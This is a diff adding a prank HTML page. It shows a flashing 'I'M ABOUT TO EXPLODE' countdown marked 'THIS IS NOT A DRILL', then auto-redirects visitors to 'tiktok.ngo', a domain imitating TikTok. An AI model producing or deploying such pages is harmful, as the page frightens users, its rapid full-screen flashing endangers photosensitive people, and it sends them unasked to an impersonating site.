@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+  <title>WARNING</title>
+
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+
+      display: flex;
+      align-items: center;
+      justify-content: center;
+
+      background: black;
+      color: white;
+
+      font-family: Impact, Arial, sans-serif;
+
+      overflow: hidden;
+    }
+
+    .container {
+      text-align: center;
+      padding: 30px;
+    }
+
+    h1 {
+      margin: 0;
+
+      font-size: clamp(45px, 10vw, 110px);
+      letter-spacing: 3px;
+
+      color: #ff1a1a;
+
+      text-shadow:
+        0 0 10px red,
+        0 0 30px red,
+        0 0 60px #ff0000;
+
+      animation: shake 0.15s infinite;
+    }
+
+    .sub {
+      margin-top: 20px;
+
+      font-size: clamp(25px, 5vw, 50px);
+
+      color: white;
+
+      text-shadow:
+        0 0 10px white;
+    }
+
+    #countdown {
+      margin-top: 30px;
+
+      font-size: clamp(100px, 25vw, 250px);
+
+      color: #ffdd00;
+
+      text-shadow:
+        0 0 20px #ff8800,
+        0 0 50px red;
+
+      animation: pulse 0.5s infinite alternate;
+    }
+
+    .warning {
+      margin-top: 30px;
+
+      font-family: Arial, sans-serif;
+      font-size: 16px;
+
+      opacity: 0.7;
+    }
+
+    body.flash {
+      animation: flash 0.25s infinite;
+    }
+
+    @keyframes shake {
+      0% {
+        transform: translate(0, 0);
+      }
+
+      25% {
+        transform: translate(4px, -3px);
+      }
+
+      50% {
+        transform: translate(-4px, 3px);
+      }
+
+      75% {
+        transform: translate(3px, 4px);
+      }
+
+      100% {
+        transform: translate(-3px, -4px);
+      }
+    }
+
+    @keyframes pulse {
+      from {
+        transform: scale(1);
+      }
+
+      to {
+        transform: scale(1.15);
+      }
+    }
+
+    @keyframes flash {
+      0% {
+        background: black;
+      }
+
+      50% {
+        background: #5a0000;
+      }
+
+      100% {
+        background: black;
+      }
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+
+    <h1>
+      I'M ABOUT TO EXPLODE
+    </h1>
+
+    <div class="sub">
+      IN
+    </div>
+
+    <div id="countdown">
+      5
+    </div>
+
+    <div class="warning">
+      THIS IS NOT A DRILL
+    </div>
+
+  </div>
+
+
+  <script>
+    const redirectURL =
+      "https://tiktok.ngo/ZSVWTFRUX/";
+
+    let seconds = 5;
+
+    const countdown =
+      document.getElementById("countdown");
+
+    document.body.classList.add("flash");
+
+    const timer = setInterval(() => {
+
+      seconds--;
+
+      countdown.textContent = seconds;
+
+      if (seconds <= 0) {
+
+        clearInterval(timer);
+
+        countdown.textContent = "💥";
+
+        document.querySelector("h1").textContent =
+          "AAAAAAAAAAAAAAAA";
+
+        setTimeout(() => {
+
+          window.location.href = redirectURL;
+
+        }, 400);
+
+      }
+
+    }, 1000);
+  </script>
+
+</body>
+</html>
